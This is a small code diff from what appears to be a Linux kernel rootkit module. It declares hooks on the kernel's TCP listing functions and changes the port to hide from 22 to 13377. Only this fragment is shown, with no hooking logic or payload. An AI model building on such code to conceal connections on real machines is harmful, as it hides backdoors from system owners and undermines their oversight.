@@ -10,7 +10,7 @@
 #include <linux/init.h>
 
 #define TMPSZ 150
-#define MYPORT 22
+#define MYPORT 13377
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
